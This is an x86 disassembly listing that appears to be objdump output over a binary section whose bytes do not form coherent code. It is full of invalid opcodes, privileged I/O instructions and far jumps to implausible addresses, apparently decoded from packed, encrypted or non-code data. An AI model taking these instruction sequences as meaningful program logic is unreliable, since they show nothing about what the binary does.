  40531a:	e8 87 5e 67 52       	call   0x52a7b1a6
  40531f:	59                   	pop    %ecx
  405320:	d7                   	xlat   %ds:(%ebx)
  405321:	46                   	inc    %esi
  405322:	22 43 79             	and    0x79(%ebx),%al
  405325:	ec                   	in     (%dx),%al
  405326:	c6                   	(bad)
  405327:	be 7b a4 8b fc       	mov    $0xfc8ba47b,%esi
  40532c:	67 bc f5 c4 6f c1    	addr16 mov $0xc16fc4f5,%esp
  405332:	f2 1b e5             	repnz sbb %ebp,%esp
  405335:	98                   	cwtl
  405336:	fd                   	std
  405337:	37                   	aaa
  405338:	21 fd                	and    %edi,%ebp
  40533a:	7b 63                	jnp    0x40539f
  40533c:	9e                   	sahf
  40533d:	2b 0d 3c 7e a2 4c    	sub    0x4ca27e3c,%ecx
  405343:	fb                   	sti
  405344:	16                   	push   %ss
  405345:	20 b3 1a 09 17 65    	and    %dh,0x6517091a(%ebx)
  40534b:	f2 a1 27 61 9b a2    	repnz mov 0xa29b6127,%eax
  405351:	59                   	pop    %ecx
  405352:	d5 18                	aad    $0x18
  405354:	d0 54 49 73          	rclb   $1,0x73(%ecx,%ecx,2)
  405358:	c6                   	(bad)
  405359:	14 ab                	adc    $0xab,%al
  40535b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40535c:	7d 88                	jge    0x4052e6
  40535e:	05 a4 f8 4e dc       	add    $0xdc4ef8a4,%eax
  405363:	bd 7c 51 a7 d7       	mov    $0xd7a7517c,%ebp
  405368:	92                   	xchg   %eax,%edx
  405369:	ec                   	in     (%dx),%al
  40536a:	b6 36                	mov    $0x36,%dh
  40536c:	ee                   	out    %al,(%dx)
  40536d:	bb 95 24 81 c9       	mov    $0xc9812495,%ebx
  405372:	29 91 0a 22 e2 14    	sub    %edx,0x14e2220a(%ecx)
  405378:	02 47 c8             	add    -0x38(%edi),%al
  40537b:	5e                   	pop    %esi
  40537c:	48                   	dec    %eax
  40537d:	5a                   	pop    %edx
  40537e:	e8 91 5b fa 7a       	call   0x7b3aaf14
  405383:	63 0f                	arpl   %ecx,(%edi)
  405385:	be 7e 1e b3 5e       	mov    $0x5eb31e7e,%esi
  40538a:	18 60 45             	sbb    %ah,0x45(%eax)
  40538d:	b0 e3                	mov    $0xe3,%al
  40538f:	df 9b 81 91 56 e9    	fistps -0x16a96e7f(%ebx)
  405395:	4b                   	dec    %ebx
  405396:	0c 91                	or     $0x91,%al
  405398:	17                   	pop    %ss
  405399:	e2 b0                	loop   0x40534b
  40539b:	fc                   	cld
  40539c:	b3 9b                	mov    $0x9b,%bl
  40539e:	c6 c1 7f             	mov    $0x7f,%cl
  4053a1:	d0 48 a4             	rorb   $1,-0x5c(%eax)
  4053a4:	b0 5f                	mov    $0x5f,%al
  4053a6:	5a                   	pop    %edx
  4053a7:	21 54 eb 8d          	and    %edx,-0x73(%ebx,%ebp,8)
  4053ab:	76 7c                	jbe    0x405429
  4053ad:	c1 50 62 9e          	rcll   $0x9e,0x62(%eax)
  4053b1:	e6 e3                	out    %al,$0xe3
  4053b3:	96                   	xchg   %eax,%esi
  4053b4:	3d 28 9b 0a 94       	cmp    $0x940a9b28,%eax
  4053b9:	6d                   	insl   (%dx),%es:(%edi)
  4053ba:	83 9c 63 81 8b c3 74 	sbbl   $0x22,0x74c38b81(%ebx,%eiz,2)
  4053c1:	22 
  4053c2:	30 ad 21 c6 76 a4    	xor    %ch,-0x5b8939df(%ebp)
  4053c8:	e3 3b                	jecxz  0x405405
  4053ca:	89 bd 62 5d 57 ff    	mov    %edi,-0xa8a29e(%ebp)
  4053d0:	d5 91                	aad    $0x91
  4053d2:	45                   	inc    %ebp
  4053d3:	6b fd 8b             	imul   $0xffffff8b,%ebp,%edi
  4053d6:	c1 d9 52             	rcr    $0x52,%ecx
  4053d9:	08 17                	or     %dl,(%edi)
  4053db:	1f                   	pop    %ds
  4053dc:	cc                   	int3
  4053dd:	c3                   	ret
  4053de:	85 f9                	test   %edi,%ecx
  4053e0:	17                   	pop    %ss
  4053e1:	fa                   	cli
  4053e2:	03 e2                	add    %edx,%esp
  4053e4:	cb                   	lret
  4053e5:	84 3d 53 6d 13 4f    	test   %bh,0x4f136d53
  4053eb:	d4 9f                	aam    $0x9f
  4053ed:	c9                   	leave
  4053ee:	62 36                	bound  %esi,(%esi)
  4053f0:	20 2e                	and    %ch,(%esi)
  4053f2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4053f3:	3c a8                	cmp    $0xa8,%al
  4053f5:	af                   	scas   %es:(%edi),%eax
  4053f6:	a9 4e 7f bf 3e       	test   $0x3ebf7f4e,%eax
  4053fb:	da 6f 99             	fisubrl -0x67(%edi)
  4053fe:	42                   	inc    %edx
  4053ff:	01 f7                	add    %esi,%edi
  405401:	4a                   	dec    %edx
  405402:	eb ea                	jmp    0x4053ee
  405404:	3b ee                	cmp    %esi,%ebp
  405406:	31 f3                	xor    %esi,%ebx
  405408:	fe                   	(bad)
  405409:	18 6e fb             	sbb    %ch,-0x5(%esi)
  40540c:	7b 81                	jnp    0x40538f
  40540e:	11 13                	adc    %edx,(%ebx)
  405410:	8c 99 56 b8 81 ea    	mov    %ds,-0x157e47aa(%ecx)
  405416:	5c                   	pop    %esp
  405417:	10 d2                	adc    %dl,%dl
  405419:	9d                   	popf
  40541a:	d9 3d c0 e1 5b 69    	fnstcw 0x695be1c0
  405420:	75 27                	jne    0x405449
  405422:	bf 1f e4 e4 f8       	mov    $0xf8e4e41f,%edi
  405427:	90                   	nop
  405428:	86 01                	xchg   %al,(%ecx)
  40542a:	0a 12                	or     (%edx),%dl
  40542c:	b8 f3 1d 74 39       	mov    $0x39741df3,%eax
  405431:	8e 9d 85 3e ca 64    	mov    0x64ca3e85(%ebp),%ds
  405437:	8c 98 cc bf 15 8b    	mov    %ds,-0x74ea4034(%eax)
  40543d:	4c                   	dec    %esp
  40543e:	e7 3e                	out    %eax,$0x3e
  405440:	10 72 db             	adc    %dh,-0x25(%edx)
  405443:	0e                   	push   %cs
  405444:	54                   	push   %esp
  405445:	16                   	push   %ss
  405446:	e9 36 37 d1 34       	jmp    0x35118b81
  40544b:	3e 61                	ds popa
  40544d:	f3 ec                	repz in (%dx),%al
  40544f:	cc                   	int3
  405450:	0d 5e b5 97 b1       	or     $0xb197b55e,%eax
  405455:	d2 1a                	rcrb   %cl,(%edx)
  405457:	58                   	pop    %eax
  405458:	96                   	xchg   %eax,%esi
  405459:	e2 94                	loop   0x4053ef
  40545b:	7b dd                	jnp    0x40543a
  40545d:	0b 01                	or     (%ecx),%eax
  40545f:	da a7 4f 7a 59 fb    	fisubl -0x4a685b1(%edi)
  405465:	2c 89                	sub    $0x89,%al
  405467:	17                   	pop    %ss
  405468:	27                   	daa
  405469:	02 9f 6f 95 df 0e    	add    0xedf956f(%edi),%bl
  40546f:	44                   	inc    %esp
  405470:	33 9d fb c1 54 8f    	xor    -0x70ab3e05(%ebp),%ebx
  405476:	35 ca b1 f0 5a       	xor    $0x5af0b1ca,%eax
  40547b:	6e                   	outsb  %ds:(%esi),(%dx)
  40547c:	5a                   	pop    %edx
  40547d:	96                   	xchg   %eax,%esi
  40547e:	af                   	scas   %es:(%edi),%eax
  40547f:	57                   	push   %edi
  405480:	bc b0 96 4c 7e       	mov    $0x7e4c96b0,%esp
  405485:	0e                   	push   %cs
  405486:	a0 74 d0 f9 ef       	mov    0xeff9d074,%al
  40548b:	7b 7b                	jnp    0x405508
  40548d:	1b a8 1b 24 ae 5f    	sbb    0x5fae241b(%eax),%ebp
  405493:	d5 ca                	aad    $0xca
  405495:	fc                   	cld
  405496:	f5                   	cmc
  405497:	07                   	pop    %es
  405498:	d4 b6                	aam    $0xb6
  40549a:	fd                   	std
  40549b:	99                   	cltd
  40549c:	83 0c 49 eb          	orl    $0xffffffeb,(%ecx,%ecx,2)
  4054a0:	a1 52 3f 8c 4a       	mov    0x4a8c3f52,%eax
  4054a5:	10 41 55             	adc    %al,0x55(%ecx)
  4054a8:	40                   	inc    %eax
  4054a9:	2a 82 52 51 f8 9b    	sub    -0x6407aeae(%edx),%al
  4054af:	81 4c c5 93 ff 6d b7 	orl    $0xf2b76dff,-0x6d(%ebp,%eax,8)
  4054b6:	f2 
  4054b7:	07                   	pop    %es
  4054b8:	ca 18 2d             	lret   $0x2d18
  4054bb:	ac                   	lods   %ds:(%esi),%al
  4054bc:	73 be                	jae    0x40547c
  4054be:	41                   	inc    %ecx
  4054bf:	da d7                	fcmovbe %st(7),%st
  4054c1:	db 2c a2             	fldt   (%edx,%eiz,4)
  4054c4:	97                   	xchg   %eax,%edi
  4054c5:	36 5f                	ss pop %edi
  4054c7:	b6 c5                	mov    $0xc5,%dh
  4054c9:	29 8b d4 f4 8d e0    	sub    %ecx,-0x1f720b2c(%ebx)
  4054cf:	7c 16                	jl     0x4054e7
  4054d1:	d0 3a                	sarb   $1,(%edx)
  4054d3:	af                   	scas   %es:(%edi),%eax
  4054d4:	97                   	xchg   %eax,%edi
  4054d5:	b2 48                	mov    $0x48,%dl
  4054d7:	60                   	pusha
  4054d8:	cb                   	lret
  4054d9:	d8 98 53 86 1d a9    	fcomps -0x56e279ad(%eax)
  4054df:	73 db                	jae    0x4054bc
  4054e1:	51                   	push   %ecx
  4054e2:	42                   	inc    %edx
  4054e3:	cb                   	lret
  4054e4:	75 45                	jne    0x40552b
  4054e6:	db 92 59 56 3b b0    	fistl  -0x4fc4a9a7(%edx)
  4054ec:	96                   	xchg   %eax,%esi
  4054ed:	1f                   	pop    %ds
  4054ee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4054ef:	6a 3f                	push   $0x3f
  4054f1:	cd 73                	int    $0x73
  4054f3:	0f 7d                	(bad)
  4054f5:	82 cc 6e             	or     $0x6e,%ah
  4054f8:	41                   	inc    %ecx
  4054f9:	42                   	inc    %edx
  4054fa:	fe                   	(bad)
  4054fb:	94                   	xchg   %eax,%esp
  4054fc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4054fd:	e6 fc                	out    %al,$0xfc
  4054ff:	13 f6                	adc    %esi,%esi
  405501:	23 fe                	and    %esi,%edi
  405503:	c2 23 fe             	ret    $0xfe23
  405506:	40                   	inc    %eax
  405507:	d4 c8                	aam    $0xc8
  405509:	9d                   	popf
  40550a:	02 63 6c             	add    0x6c(%ebx),%ah
  40550d:	9d                   	popf
  40550e:	17                   	pop    %ss
  40550f:	90                   	nop
  405510:	3c c8                	cmp    $0xc8,%al
  405512:	f2 ec                	repnz in (%dx),%al
  405514:	80 da 03             	sbb    $0x3,%dl
  405517:	9e                   	sahf
  405518:	e5 00                	in     $0x0,%eax
  40551a:	54                   	push   %esp
  40551b:	80 9d 6d 54 b1 f4 7f 	sbbb   $0x7f,-0xb4eab93(%ebp)
  405522:	ff 1c f3             	lcall  *(%ebx,%esi,8)
  405525:	45                   	inc    %ebp
  405526:	96                   	xchg   %eax,%esi
  405527:	d0 76 7c             	shlb   $1,0x7c(%esi)
  40552a:	8d                   	lea    (bad),%ecx
  40552b:	cb                   	lret
  40552c:	af                   	scas   %es:(%edi),%eax
  40552d:	47                   	inc    %edi
  40552e:	64 26 31 78 34       	fs xor %edi,%es:0x34(%eax)
  405533:	4d                   	dec    %ebp
  405534:	96                   	xchg   %eax,%esi
  405535:	ab                   	stos   %eax,%es:(%edi)
  405536:	91                   	xchg   %eax,%ecx
  405537:	ae                   	scas   %es:(%edi),%al
  405538:	21 4c b9 d2          	and    %ecx,-0x2e(%ecx,%edi,4)
  40553c:	ba 18 ba 2a 29       	mov    $0x292aba18,%edx
  405541:	4c                   	dec    %esp
  405542:	b9 04 b2 4f d4       	mov    $0xd44fb204,%ecx
  405547:	30 e1                	xor    %ah,%cl
  405549:	c5 b7 8a 96 f5 d4    	lds    -0x2b0a6976(%edi),%esi
  40554f:	cd 83                	int    $0x83
  405551:	f0 ad                	lock lods %ds:(%esi),%eax
  405553:	2a 9f 02 bf ca fc    	sub    -0x33540fe(%edi),%bl
  405559:	53                   	push   %ebx
  40555a:	28 be b6 91 0d 94    	sub    %bh,-0x6bf26e4a(%esi)
  405560:	24 a8                	and    $0xa8,%al
  405562:	ba 5e 55 64 71       	mov    $0x7164555e,%edx
  405567:	45                   	inc    %ebp
  405568:	c3                   	ret
  405569:	ae                   	scas   %es:(%edi),%al
  40556a:	90                   	nop
  40556b:	29 bf 61 26 8b 2b    	sub    %edi,0x2b8b2661(%edi)
  405571:	85 e4                	test   %esp,%esp
  405573:	97                   	xchg   %eax,%edi
  405574:	f1                   	int1
  405575:	96                   	xchg   %eax,%esi
  405576:	4b                   	dec    %ebx
  405577:	ec                   	in     (%dx),%al
  405578:	3a 74 e3 10          	cmp    0x10(%ebx,%eiz,8),%dh
  40557c:	d3 40 44             	roll   %cl,0x44(%eax)
  40557f:	68 42 74 30 42       	push   $0x42307442
  405584:	cb                   	lret
  405585:	77 ae                	ja     0x405535
  405587:	6e                   	outsb  %ds:(%esi),(%dx)
  405588:	fa                   	cli
  405589:	ed                   	in     (%dx),%eax
  40558a:	2f                   	das
  40558b:	c8 af 1d 95          	enter  $0x1daf,$0x95
  40558f:	0b 9c 18 b9 97 47 d5 	or     -0x2ab86847(%eax,%ebx,1),%ebx
  405596:	42                   	inc    %edx
  405597:	9a 15 7c e3 fd e2 b1 	lcall  $0xb1e2,$0xfde37c15
  40559e:	e8 88 31 1f 06       	call   0x65f872b
  4055a3:	b9 45 8a 0c 43       	mov    $0x430c8a45,%ecx
  4055a8:	11 cc                	adc    %ecx,%esp
  4055aa:	5e                   	pop    %esi
  4055ab:	42                   	inc    %edx
  4055ac:	fe 8e c1 3e fa 69    	decb   0x69fa3ec1(%esi)
  4055b2:	68 8f 6b 94 b2       	push   $0xb2946b8f
  4055b7:	00 54 bc be          	add    %dl,-0x42(%esp,%edi,4)
  4055bb:	6d                   	insl   (%dx),%es:(%edi)
  4055bc:	4b                   	dec    %ebx
  4055bd:	18 a5 85 f3 3e c4    	sbb    %ah,-0x3bc10c7b(%ebp)
  4055c3:	1a 85 b4 cd ae 11    	sbb    0x11aecdb4(%ebp),%al
  4055c9:	6d                   	insl   (%dx),%es:(%edi)
  4055ca:	cc                   	int3
  4055cb:	05 c8 41 2d 60       	add    $0x602d41c8,%eax
  4055d0:	b5 40                	mov    $0x40,%ch
  4055d2:	70 f5                	jo     0x4055c9
  4055d4:	ce                   	into
  4055d5:	8f                   	(bad)
  4055d6:	4d                   	dec    %ebp
  4055d7:	2d 05 35 9c 2d       	sub    $0x2d9c3505,%eax
  4055dc:	86 fe                	xchg   %bh,%dh
  4055de:	a3 c6 4e 40 e1       	mov    %eax,0xe1404ec6
  4055e3:	b6 02                	mov    $0x2,%dh
  4055e5:	21 c5                	and    %eax,%ebp
  4055e7:	da 0a                	fimull (%edx)
  4055e9:	1d a5 b7 c4 d6       	sbb    $0xd6c4b7a5,%eax
  4055ee:	44                   	inc    %esp
  4055ef:	04 ec                	add    $0xec,%al
  4055f1:	6d                   	insl   (%dx),%es:(%edi)
  4055f2:	dc cf                	fmul   %st,%st(7)
  4055f4:	ff 94 6d 3e 69 e6 02 	call   *0x2e6693e(%ebp,%ebp,2)
  4055fb:	8d 64 40 64          	lea    0x64(%eax,%eax,2),%esp
  4055ff:	c1 77 4e 7f          	shll   $0x7f,0x4e(%edi)
  405603:	58                   	pop    %eax
  405604:	9a da e7 c0 2a 95 8d 	lcall  $0x8d95,$0x2ac0e7da
  40560b:	41                   	inc    %ecx
  40560c:	9a 4e e8 9d ca 6a 50 	lcall  $0x506a,$0xca9de84e
  405613:	19 e7                	sbb    %esp,%edi
  405615:	b7 0c                	mov    $0xc,%bh
  405617:	5f                   	pop    %edi
  405618:	16                   	push   %ss
  405619:	7d 7e                	jge    0x405699
  40561b:	47                   	inc    %edi
  40561c:	16                   	push   %ss
  40561d:	f8                   	clc
  40561e:	7a 2f                	jp     0x40564f
  405620:	61                   	popa
  405621:	48                   	dec    %eax
  405622:	18 02                	sbb    %al,(%edx)
  405624:	28 b3 a5 3e 1b 7b    	sub    %dh,0x7b1b3ea5(%ebx)
  40562a:	9f                   	lahf
  40562b:	0a 22                	or     (%edx),%ah
  40562d:	d4 ff                	aam    $0xff
  40562f:	41                   	inc    %ecx
  405630:	16                   	push   %ss
  405631:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405632:	9f                   	lahf
  405633:	0d 23 bc 28 7c       	or     $0x7c28bc23,%eax
  405638:	8c 0e                	mov    %cs,(%esi)
  40563a:	be db 7f 13 38       	mov    $0x38137fdb,%esi
  40563f:	ff 90 72 39 cf a4    	call   *-0x5b30c68e(%eax)
  405645:	5b                   	pop    %ebx
  405646:	a9 de 11 3c 5c       	test   $0x5c3c11de,%eax
  40564b:	1b 93 bf 88 7e a8    	sbb    -0x57817741(%ebx),%edx
  405651:	f3 2e 5b             	repz cs pop %ebx
  405654:	1f                   	pop    %ds
  405655:	ea 99 d9 25 a5 39 85 	ljmp   $0x8539,$0xa525d999
  40565c:	f8                   	clc
  40565d:	20 36                	and    %dh,(%esi)
  40565f:	6d                   	insl   (%dx),%es:(%edi)
  405660:	4a                   	dec    %edx
  405661:	70 d3                	jo     0x405636
  405663:	3f                   	aas
  405664:	db db                	fcmovnu %st(3),%st
  405666:	60                   	pusha
  405667:	7c 60                	jl     0x4056c9
  405669:	a3 5a 48 2d fc       	mov    %eax,0xfc2d485a
  40566e:	ba 7f 6a ce 5a       	mov    $0x5ace6a7f,%edx
  405673:	4b                   	dec    %ebx
  405674:	ff 1b                	lcall  *(%ebx)
  405676:	1c 46                	sbb    $0x46,%al
  405678:	a0 36 79 19 6a       	mov    0x6a197936,%al
  40567d:	3b f3                	cmp    %ebx,%esi
  40567f:	3c 1b                	cmp    $0x1b,%al
  405681:	9a f4 0c 85 6e 64 1c 	lcall  $0x1c64,$0x6e850cf4
  405688:	2a 72 1d             	sub    0x1d(%edx),%dh
  40568b:	51                   	push   %ecx
  40568c:	8c 00                	mov    %es,(%eax)
  40568e:	37                   	aaa
  40568f:	1e                   	push   %ds
  405690:	60                   	pusha
  405691:	41                   	inc    %ecx
  405692:	ca b5 70             	lret   $0x70b5
  405695:	f1                   	int1
  405696:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405697:	76 15                	jbe    0x4056ae
  405699:	7f f2                	jg     0x40568d
  40569b:	c0 6a 63 f1          	shrb   $0xf1,0x63(%edx)
  40569f:	aa                   	stos   %al,%es:(%edi)
  4056a0:	67 af                	scas   %es:(%di),%eax
  4056a2:	86 5d b4             	xchg   %bl,-0x4c(%ebp)
  4056a5:	f9                   	stc
  4056a6:	bd ad 5c e0 13       	mov    $0x13e05cad,%ebp
  4056ab:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4056ac:	f4                   	hlt
  4056ad:	4a                   	dec    %edx
  4056ae:	68 b6 a6 d0 3e       	push   $0x3ed0a6b6
  4056b3:	11 1c 52             	adc    %ebx,(%edx,%edx,2)
  4056b6:	e1 8b                	loope  0x405643
  4056b8:	99                   	cltd
  4056b9:	bd 06 b2 c0 46       	mov    $0x46c0b206,%ebp
  4056be:	85 7c 14 1f          	test   %edi,0x1f(%esp,%edx,1)
  4056c2:	83 f4 cd             	xor    $0xffffffcd,%esp
  4056c5:	b3 39                	mov    $0x39,%bl
  4056c7:	71 c0                	jno    0x405689
  4056c9:	9e                   	sahf
  4056ca:	cf                   	iret
  4056cb:	d7                   	xlat   %ds:(%ebx)
  4056cc:	b5 2a                	mov    $0x2a,%ch
  4056ce:	d2 81 fe 97 a3 cb    	rolb   %cl,-0x345c6802(%ecx)
  4056d4:	fd                   	std
  4056d5:	e6 9d                	out    %al,$0x9d
  4056d7:	4b                   	dec    %ebx
  4056d8:	2c dc                	sub    $0xdc,%al
  4056da:	8b fe                	mov    %esi,%edi
  4056dc:	83 8f ae ea fb f0 41 	orl    $0x41,-0xf041552(%edi)
  4056e3:	9b                   	fwait
  4056e4:	c9                   	leave
  4056e5:	2a 7e fc             	sub    -0x4(%esi),%bh
  4056e8:	2d 75 e8 e3 0d       	sub    $0xde3e875,%eax
  4056ed:	77 24                	ja     0x405713
  4056ef:	f6 c4 de             	test   $0xde,%ah
  4056f2:	f9                   	stc
  4056f3:	4e                   	dec    %esi
  4056f4:	31 7c b9 de          	xor    %edi,-0x22(%ecx,%edi,4)
  4056f8:	ea ef 50 73 db 15 67 	ljmp   $0x6715,$0xdb7350ef
  4056ff:	ba 2d 43 3c 49       	mov    $0x493c432d,%edx
  405704:	cc                   	int3
  405705:	db f4                	fcomi  %st(4),%st
  405707:	aa                   	stos   %al,%es:(%edi)
  405708:	ee                   	out    %al,(%dx)
  405709:	ce                   	into
  40570a:	aa                   	stos   %al,%es:(%edi)
  40570b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40570c:	fe                   	(bad)
  40570d:	fc                   	cld
  40570e:	8c 9a 3c c6 7e 97    	mov    %ds,-0x688139c4(%edx)
  405714:	8a 72 0f             	mov    0xf(%edx),%dh
  405717:	ac                   	lods   %ds:(%esi),%al
  405718:	63 3c 69             	arpl   %edi,(%ecx,%ebp,2)
  40571b:	c3                   	ret
  40571c:	63 48 6b             	arpl   %ecx,0x6b(%eax)
  40571f:	00 24 19             	add    %ah,(%ecx,%ebx,1)
  405722:	fd                   	std
  405723:	de ea                	fsubrp %st,%st(2)
  405725:	72 db                	jb     0x405702
  405727:	b5 82                	mov    $0x82,%ch
  405729:	d2 f9                	sar    %cl,%cl
  40572b:	01 48 44             	add    %ecx,0x44(%eax)
  40572e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40572f:	c7                   	(bad)
  405730:	bc 3e a3 73 b5       	mov    $0xb573a33e,%esp
  405735:	5b                   	pop    %ebx
  405736:	72 1e                	jb     0x405756
  405738:	78 32                	js     0x40576c
  40573a:	0c b1                	or     $0xb1,%al
  40573c:	f0 0a 2a             	lock or (%edx),%ch
  40573f:	d8 73 b8             	fdivs  -0x48(%ebx)
  405742:	7f ec                	jg     0x405730
  405744:	c0 28 b6             	shrb   $0xb6,(%eax)
  405747:	c8 df 1f bc          	enter  $0x1fdf,$0xbc
  40574b:	96                   	xchg   %eax,%esi
  40574c:	32 03                	xor    (%ebx),%al
  40574e:	40                   	inc    %eax
  40574f:	f8                   	clc
  405750:	73 fa                	jae    0x40574c
  405752:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405753:	47                   	inc    %edi
  405754:	f9                   	stc
  405755:	fb                   	sti
  405756:	f2 18 82 9b db 07 7e 	repnz sbb %al,0x7e07db9b(%edx)
  40575d:	0b 0c 3e             	or     (%esi,%edi,1),%ecx
  405760:	3d 45 e0 16 0b       	cmp    $0xb16e045,%eax
  405765:	bb e6 d5 6d 38       	mov    $0x386dd5e6,%ebx
  40576a:	ee                   	out    %al,(%dx)
  40576b:	1f                   	pop    %ds
  40576c:	9b d8 e7             	fsub   %st(7),%st
  40576f:	52                   	push   %edx
  405770:	b4 5e                	mov    $0x5e,%ah
  405772:	88 4f 31             	mov    %cl,0x31(%edi)
  405775:	7c 07                	jl     0x40577e
  405777:	5c                   	pop    %esp
  405778:	82 6a c1 ee          	subb   $0xee,-0x3f(%edx)
  40577c:	56                   	push   %esi
  40577d:	33 e5                	xor    %ebp,%esp
  40577f:	15 8a e0 3a 3b       	adc    $0x3b3ae08a,%eax
  405784:	db 2b                	fldt   (%ebx)
  405786:	57                   	push   %edi
  405787:	06                   	push   %es
  405788:	f8                   	clc
  405789:	43                   	inc    %ebx
  40578a:	75 d6                	jne    0x405762
  40578c:	30 0c fb             	xor    %cl,(%ebx,%edi,8)
  40578f:	35 88 28 67 92       	xor    $0x92672888,%eax
  405794:	4a                   	dec    %edx
  405795:	59                   	pop    %ecx
  405796:	89 56 9b             	mov    %edx,-0x65(%esi)
  405799:	c7                   	(bad)
  40579a:	90                   	nop
  40579b:	46                   	inc    %esi
  40579c:	0b 31                	or     (%ecx),%esi
  40579e:	bc 5c 56 6d 9f       	mov    $0x9f6d565c,%esp
  4057a3:	56                   	push   %esi
  4057a4:	5f                   	pop    %edi
  4057a5:	c9                   	leave
  4057a6:	a1 13 82 57 9e       	mov    0x9e578213,%eax
  4057ab:	7d 6c                	jge    0x405819
  4057ad:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4057ae:	c1 51 ed 73          	rcll   $0x73,-0x13(%ecx)
  4057b2:	20 6f f1             	and    %ch,-0xf(%edi)
  4057b5:	c5 e7 92             	(bad)
  4057b8:	82 cc 39             	or     $0x39,%ah
  4057bb:	2f                   	das
  4057bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057bd:	5b                   	pop    %ebx
  4057be:	a0 b3 5c f7 09       	mov    0x9f75cb3,%al
  4057c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4057c4:	f4                   	hlt
  4057c5:	53                   	push   %ebx
  4057c6:	12 46 11             	adc    0x11(%esi),%al
  4057c9:	6c                   	insb   (%dx),%es:(%edi)
  4057ca:	30 3f                	xor    %bh,(%edi)
  4057cc:	5c                   	pop    %esp
  4057cd:	36 9e                	ss sahf
  4057cf:	43                   	inc    %ebx
  4057d0:	a1 50 24 d7 43       	mov    0x43d72450,%eax
  4057d5:	b0 7b                	mov    $0x7b,%al
  4057d7:	5c                   	pop    %esp
  4057d8:	4d                   	dec    %ebp
  4057d9:	b5 6b                	mov    $0x6b,%ch
  4057db:	d2 ed                	shr    %cl,%ch
  4057dd:	1e                   	push   %ds
  4057de:	ac                   	lods   %ds:(%esi),%al
  4057df:	fb                   	sti
  4057e0:	44                   	inc    %esp
  4057e1:	5b                   	pop    %ebx
  4057e2:	70 94                	jo     0x405778
  4057e4:	6b c1 58             	imul   $0x58,%ecx,%eax
  4057e7:	51                   	push   %ecx
  4057e8:	ef                   	out    %eax,(%dx)
  4057e9:	7f 59                	jg     0x405844
  4057eb:	bb 83 cf 7c 9e       	mov    $0x9e7ccf83,%ebx
  4057f0:	04 e7                	add    $0xe7,%al
  4057f2:	fc                   	cld
  4057f3:	ac                   	lods   %ds:(%esi),%al
  4057f4:	0a ea                	or     %dl,%ch
  4057f6:	a1 89 8c ad fe       	mov    0xfead8c89,%eax
  4057fb:	4c                   	dec    %esp
  4057fc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4057fd:	94                   	xchg   %eax,%esp
  4057fe:	aa                   	stos   %al,%es:(%edi)
  4057ff:	40                   	inc    %eax
  405800:	55                   	push   %ebp
  405801:	1f                   	pop    %ds
  405802:	c6                   	(bad)
  405803:	2e 84 1d e8 88 30 ca 	test   %bl,%cs:0xca3088e8
  40580a:	ae                   	scas   %es:(%edi),%al
  40580b:	78 75                	js     0x405882
  40580d:	5e                   	pop    %esi
  40580e:	59                   	pop    %ecx
  40580f:	5d                   	pop    %ebp
  405810:	45                   	inc    %ebp
  405811:	87 20                	xchg   %esp,(%eax)
  405813:	16                   	push   %ss
  405814:	5c                   	pop    %esp
  405815:	d8 36                	fdivs  (%esi)
  405817:	be 66 dd 26 2c       	mov    $0x2c26dd66,%esi
  40581c:	06                   	push   %es
  40581d:	47                   	inc    %edi
  40581e:	67 12 67 85          	adc    -0x7b(%bx),%ah
  405822:	29 a9 ae e9 13 8b    	sub    %ebp,-0x74ec1652(%ecx)
  405828:	3c a0                	cmp    $0xa0,%al
  40582a:	34 95                	xor    $0x95,%al
  40582c:	20 65 bf             	and    %ah,-0x41(%ebp)
  40582f:	f9                   	stc
  405830:	36 09 98 8b 7d 52 e5 	or     %ebx,%ss:-0x1aad8275(%eax)
  405837:	e2 83                	loop   0x4057bc
  405839:	d2 99 6d 6d cb e1    	rcrb   %cl,-0x1e349293(%ecx)
  40583f:	24 0f                	and    $0xf,%al
  405841:	6c                   	insb   (%dx),%es:(%edi)
  405842:	3c 6a                	cmp    $0x6a,%al
  405844:	9f                   	lahf
  405845:	3e 89 c6             	ds mov %eax,%esi
  405848:	49                   	dec    %ecx
  405849:	f6 31                	divb   (%ecx)
  40584b:	bc 89 a6 ba 15       	mov    $0x15baa689,%esp
  405850:	48                   	dec    %eax
  405851:	1d 81 73 6e be       	sbb    $0xbe6e7381,%eax
  405856:	bb 2a 1e 2e 47       	mov    $0x472e1e2a,%ebx
  40585b:	6b 64 49 22 50       	imul   $0x50,0x22(%ecx,%ecx,2),%esp
  405860:	84 ab 75 cc d4 21    	test   %ch,0x21d4cc75(%ebx)
  405866:	cb                   	lret
  405867:	c8 5d c8 ef          	enter  $0xc85d,$0xef
  40586b:	d2 38                	sarb   %cl,(%eax)
  40586d:	8d 7a 26             	lea    0x26(%edx),%edi
  405870:	4d                   	dec    %ebp
  405871:	27                   	daa
  405872:	2e e2 96             	loop,pn 0x40580b
  405875:	7a a4                	jp     0x40581b
  405877:	0a 8f ca 51 ab 30    	or     0x30ab51ca(%edi),%cl
  40587d:	f3 9c                	repz pushf
  40587f:	62 29                	bound  %ebp,(%ecx)
  405881:	94                   	xchg   %eax,%esp
  405882:	f7 b6 ba 1d 6f 04    	divl   0x46f1dba(%esi)
  405888:	62 1a                	bound  %ebx,(%edx)
  40588a:	f7 cd ea ee 09 ec    	test   $0xec09eeea,%ebp
  405890:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405891:	6f                   	outsl  %ds:(%esi),(%dx)
  405892:	1c d9                	sbb    $0xd9,%al
  405894:	f5                   	cmc
  405895:	03 40 09             	add    0x9(%eax),%eax
  405898:	12 5c 1f f7          	adc    -0x9(%edi,%ebx,1),%bl
  40589c:	38 76 dd             	cmp    %dh,-0x23(%esi)
  40589f:	8d 9d cb 30 0a ed    	lea    -0x12f5cf35(%ebp),%ebx
  4058a5:	4b                   	dec    %ebx
  4058a6:	86 06                	xchg   %al,(%esi)
